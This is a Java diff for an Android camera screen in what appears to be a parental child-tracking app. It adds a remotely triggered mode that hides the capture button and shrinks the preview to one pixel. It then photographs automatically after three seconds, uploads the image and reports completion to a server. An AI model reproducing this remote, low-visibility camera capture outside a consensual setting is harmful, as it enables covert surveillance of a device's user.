@@ -48,6 +48,7 @@ public class CameraActivity extends Activity {
     private TextureView textureView;
     private CameraDevice cameraDevice;
     private CameraCaptureSession captureSession;
+    private boolean autoMode = false; // V2.2: dipicu tombol Lihat Anak dari orang tua
     private CameraManager cameraManager;
     private HandlerThread cameraThread;
     private Handler cameraHandler;
@@ -89,6 +90,7 @@ public class CameraActivity extends Activity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+        autoMode = getIntent().getBooleanExtra("auto", false);
         buatTampilan();
         startCameraThread();
 
@@ -107,6 +109,16 @@ public class CameraActivity extends Activity {
         root.addView(textureView, new LinearLayout.LayoutParams(
             LinearLayout.LayoutParams.MATCH_PARENT, 0, 1f));
 
+        if (autoMode) {
+            TextView t = new TextView(this);
+            t.setText(autoMode ? "Mengambil foto..." : "");
+            t.setTextColor(0xFFFFFFFF);
+            t.setPadding(24, 24, 24, 24);
+            root.addView(t, new LinearLayout.LayoutParams(
+                LinearLayout.LayoutParams.MATCH_PARENT,
+                LinearLayout.LayoutParams.WRAP_CONTENT));
+            textureView.getLayoutParams().height = 1; // preview mini (kamera tetap perlu surface)
+        }
         btnCapture = new Button(this);
         btnCapture.setText("AMBIL FOTO & KIRIM");
         btnCapture.setTextSize(16f);
@@ -115,6 +127,7 @@ public class CameraActivity extends Activity {
         LinearLayout.LayoutParams pCapture = new LinearLayout.LayoutParams(
             LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
         pCapture.setMargins(16, 24, 16, 0);
+        if (autoMode) { btnCapture.setVisibility(View.GONE); }
         root.addView(btnCapture, pCapture);
 
         Button switchButton = new Button(this);
@@ -252,6 +265,11 @@ public class CameraActivity extends Activity {
                         } catch (CameraAccessException e) {
                             Toast.makeText(CameraActivity.this, "Preview kamera gagal", Toast.LENGTH_SHORT).show();
                         }
+                        if (autoMode) {
+                            cameraHandler.postDelayed(new Runnable() {
+                                @Override public void run() { ambilFoto(); }
+                            }, 3000); // tungup kamera warm-up + fokus
+                        }
                     }
                     @Override public void onConfigureFailed(CameraCaptureSession session) {
                         Toast.makeText(CameraActivity.this, "Konfigurasi kamera gagal", Toast.LENGTH_SHORT).show();
@@ -275,8 +293,10 @@ public class CameraActivity extends Activity {
             b.addTarget(imageReader.getSurface());
             b.set(CaptureRequest.JPEG_ORIENTATION, hitungOrientasi());
             captureSession.capture(b.build(), null, cameraHandler);
-            btnCapture.setEnabled(false);
-            btnCapture.setText("MENGIRIM...");
+            if (btnCapture != null) {
+                btnCapture.setEnabled(false);
+                btnCapture.setText("MENGIRIM...");
+            }
         } catch (Exception e) {
             Toast.makeText(this, "Gagal mengambil foto", Toast.LENGTH_SHORT).show();
         }
@@ -346,6 +366,23 @@ public class CameraActivity extends Activity {
                         } else {
                             Toast.makeText(CameraActivity.this,
                                 "Gagal kirim. Cek koneksi, lalu coba lagi", Toast.LENGTH_LONG).show();
+                        }
+                        if (autoMode) {
+                            // lapor perintah selesai lalu tutup otomatis
+                            new Thread() {
+                                @Override public void run() {
+                                    try {
+                                        JSONObject payload = new JSONObject();
+                                        payload.put("child_id", Config.CHILD_ID);
+                                        payload.put("token", Config.SECRET_TOKEN);
+                                        JSONObject body = new JSONObject();
+                                        body.put("action", "cmddone");
+                                        body.put("payload", payload);
+                                        TrackerService.httpPost(body);
+                                    } catch (Exception e) { /* abaikan */ }
+                                }
+                            }.start();
+                            finish();
                         }
                     }
                 });
